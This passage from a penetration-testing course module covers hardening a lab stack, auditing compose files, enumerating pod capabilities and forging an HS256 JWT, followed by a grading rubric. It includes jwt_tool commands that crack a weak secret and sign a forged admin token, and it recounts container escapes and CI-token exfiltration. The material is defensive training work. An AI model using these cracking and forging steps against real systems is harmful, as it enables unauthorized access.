      - ELASTIC_PASSWORD=Elastic_hard!
    # remove `ports:` — reach it only from `api` on the internal network

Recreate and re-run the recon:
docker compose up -d --force-recreate
sudo nmap -sS -p 5432,6379,9200 127.0.0.1

Expected:
5432/tcp closed postgresql
6379/tcp closed redis
9200/tcp closed wap-wsp curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:9200/
# → 000 (connection refused)

Save the negative-test evidence and tear down:
{ nmap -sS -p 5432,6379,9200 127.0.0.1; echo; curl -sv http://127.0.0.1:9200/ 2>&1; } \
  > ~/pentest-tools/module04/c4-stack/hardened-negative.txt
git -C ~/pentest-tools add module04/c4-stack
git -C ~/pentest-tools commit -m "c4: stack recon + credential chain + hardened negative"
docker compose down -v
6. Independent Challenges

These are ungraded in the sense that no reference solution is provided — you invent, execute, and document. Each one lands in ~/pentest-tools/module04/independent-<n>/ with a README.md, the artifacts, and a brief detection note.
6.1 Audit a real docker-compose file for security drift

Pick any open-source docker-compose.yml you actually use — Nextcloud, Gitea, self-hosted Grafana + Prometheus + Loki, Mastodon, whatever is in your home lab. Run trivy config and docker-bench-security against it. Deliverables:

    The compose file, unmodified, in the writeup directory
    trivy config output (.txt)
    A prioritized markdown list of every finding rated HIGH or CRITICAL, with:
        the docker-compose key/line that causes it,
        a one-line explanation of the risk,
        a patched excerpt that fixes it,
        a re-scan proving the finding is gone.

Reference commands:
trivy config --severity HIGH,CRITICAL ~/labs/independent-1/docker-compose.yml \
    | tee ~/pentest-tools/module04/independent-1/trivy.txt
docker run --rm --net host --pid host --userns host --cap-add audit_control \
    -v /var/lib:/var/lib:ro -v /var/run/docker.sock:/var/run/docker.sock:ro \
    -v /usr/lib/systemd:/usr/lib/systemd:ro -v /etc:/etc:ro --label docker_bench_security \
    docker/docker-bench-security \
    | tee ~/pentest-tools/module04/independent-1/bench.txt
6.2 Enumerate pod capabilities across a namespace

Write a small Python script (k8s_caps.py) that:

    Uses the in-cluster or ~/.kube/config credentials.
    Takes a namespace as --ns.
    Prints, per pod, per container: image, securityContext.privileged, runAsUser, capabilities.add, capabilities.drop, hostPath mounts, hostNetwork.
    Emits JSON on --json and a table otherwise.

Reference skeleton — replace with your own implementation:
#!/usr/bin/env python3
import argparse, json, sys
from kubernetes import client, config

def load():
    try:
        config.load_incluster_config()
    except Exception:
        config.load_kube_config()

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ns", required=True)
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args()
    load()
    v1 = client.CoreV1Api()
    rows = []
    for p in v1.list_namespaced_pod(args.ns).items:
        for c in p.spec.containers:
            sc = c.security_context or client.V1SecurityContext()
            caps = sc.capabilities or client.V1Capabilities()
            rows.append({
                "pod": p.metadata.name, "container": c.name,
                "image": c.image,
                "privileged": bool(sc.privileged),
                "runAsUser": sc.run_as_user,
                "add": caps.add or [], "drop": caps.drop or [],
                "hostNetwork": bool(p.spec.host_network),
                "hostPaths": [v.host_path.path for v in (p.spec.volumes or [])
                              if v.host_path],
            })
    if args.json:
        json.dump(rows, sys.stdout, indent=2)
    else:
        for r in rows:
            print(r)

if __name__ == "__main__":
    main()

Deliverables: the script, sample output against the kind cluster from Challenge 2, and a short note on which findings you would push back on in a real cluster.
6.3 Forge a JWT against a lab HS256 endpoint

Stand up a tiny Flask app that accepts an HS256-signed JWT and returns different roles based on the role claim. Use the weak secret changeme. Your job:

    Log in as alice, capture the token.
    Use jwt_tool to (a) crack the secret with a small wordlist, (b) forge a token with role=admin, (c) hit the admin endpoint successfully.
    Document the fix — rotate to RS256, or use a 256-bit random secret and store it out of source.

Reference commands:
jwt_tool -h
jwt_tool "$TOKEN" -C -d rockyou.txt
jwt_tool "$TOKEN" -T                       # tamper interactively
jwt_tool "$TOKEN" -S hs256 -p 'changeme'   # sign a forged token

Deliverable: the vulnerable app source, the captured original token, the forged token, and a hardened variant of the app that rejects the forged token. Include a curl transcript for both.
7. Grading Rubric

Each challenge is scored out of 10 across three axes; total 120 points for the seven deliverables (4 reference + 3 independent).
Axis	0 pts	3 pts	6 pts	10 pts
Correctness	Exploit does not run	Runs but proof missing	Exploit works; proof captured	Exploit works, is idempotent, and re-runs cleanly
Documentation	No writeup	README only	README + commands + expected output	Full markdown writeup with rationale and detection section
Detection understanding	Not addressed	Names one signal	Provides a rule/query and expected match	Rule/query, tested match, and false-positive discussion

Bonus points (up to +10 total across the lab):

    Hardened negative test committed alongside each exploit.
    Screenshots or asciinema recordings of the exploit end-to-end.
    A CI job in the tools repo that runs the exploit against the lab compose stack and fails if the exploit unexpectedly succeeds on a hardened build.

Commit and push:

# If you keep a private remote (recommended), push:
# git push origin main

If you do not yet have a private remote, create one on your organization's GitLab or a private GitHub org — do not push exploit chains, cracked passwords, or leaked API keys to a public repository, even from a lab. The .secrets file from Challenge 3 and the app-users.json from Challenge 4 both trip GitHub push-protection and both belong only in a controlled repo.

Ensure your .gitignore at the repo root excludes obvious sensitive files:
.venv/
*.pem
*.key
.secrets
**/*token*
**/exfil.log
9. Summary and Pointer to Module 05

You have now:

    Escaped a container to root on the host by abusing a mounted Docker socket, and proved the fix.
    Enumerated and dumped every Secret in a Kubernetes cluster from an over-scoped ServiceAccount, and blocked the pattern with an OPA Gatekeeper constraint.
    Weaponized a pull_request_target workflow's untrusted expression sink to exfiltrate a CI token, and rewritten the workflow to sanitize input via an environment variable.
    Fingerprinted a five-service application stack from the outside, found a misconfigured Elasticsearch, extracted plaintext credentials, and authenticated to the API — then hardened every service and confirmed the chain breaks.

Module 05 — Enumeration — takes what you built here and industrializes it. You will replace the ad-hoc curl and nmap invocations from Challenge 4 with a repeatable, scriptable enumeration pipeline. You will feed the tooling you produced in Module 03 (portscan.py, webfuzz.py) and the target inventory you produced here into a single workflow that walks an unknown network from an initial IP to a full asset graph. Bring your ~/pentest-tools/ repository and your lab compose files with you.

Before you move on:

    Snapshot the Kali VM (Module-04-lab-clean).
    Prune Docker (docker system prune -af --volumes) to free space — the kind cluster and Elasticsearch image together are ~4 GB.
    Read the Module 05 prospectus and pre-install the tooling it lists.

See you in Module 05.
